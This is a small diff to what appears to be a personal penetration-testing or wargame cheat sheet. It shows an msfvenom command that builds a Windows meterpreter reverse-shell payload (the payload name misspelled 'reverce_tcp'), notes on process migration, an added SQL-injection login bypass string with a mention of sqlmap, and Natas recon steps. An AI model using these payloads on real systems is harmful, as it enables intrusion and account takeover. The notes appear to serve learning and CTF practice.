@@ -58,6 +58,10 @@ msfvenom -p windows/meterpreter/reverce_tcp -f war > file.war
 in here after `-p` we must add our platform and payload type and after `-f` add format and after `>` name the file.
 
 for changing process you can use `migrate`.
+
+### sql
+for getting username in sql use `' or 1=1;--`
+you can use `sqlmap` for checking database
 # Natas
 1- checking directory of website
 2- check the robots.txt
